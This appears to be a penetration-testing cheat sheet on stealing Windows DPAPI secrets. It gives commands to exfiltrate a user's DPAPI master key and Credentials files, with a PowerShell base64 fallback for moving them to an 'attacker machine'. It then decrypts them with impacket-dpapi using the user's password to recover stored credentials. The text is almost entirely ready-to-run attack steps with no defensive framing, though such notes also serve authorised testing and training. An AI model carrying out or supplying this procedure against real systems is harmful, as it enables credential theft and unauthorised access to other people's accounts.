Exfiltrate the the DPAPI master key file:
```
download C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<user SID starting with S-1-5>\<weird filename with a bunch of dashes>
```

{
If that doesn't work to exfiltrate, convert the file to base 64:
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<user SID starting with S-1-5>\<weird filename with a bunch of dashes>'))
```
On attacker machine:
```
echo "<base64 encoded filedata>" | base64 -d > masterkey
```
}

Decrypt the masterkey using user's password:
```
impacket-dpapi masterkey -file <exfiltrated masterkey file name> -sid <user SID starting with S-1-5> -password '<password>'
```

### Credentials
Exfiltrate the DPAPI credentials file:
```
download C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\<filename (full hex, all caps)>
```

{
If that doesn't work to exfiltrate, convert the file to base 64:
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\<filename (full hex, all caps)>'))
```
On attacker machine:
```
echo "<base64 encoded fildata>" | base64 -d > credentials
```
}

Decrypt the credential file using decrypted masterkey starting with "0x":
```
impacket-dpapi credential -file <exfiltrated credential file name> -key <decrypted masterkey including the "0x" prefix>
```

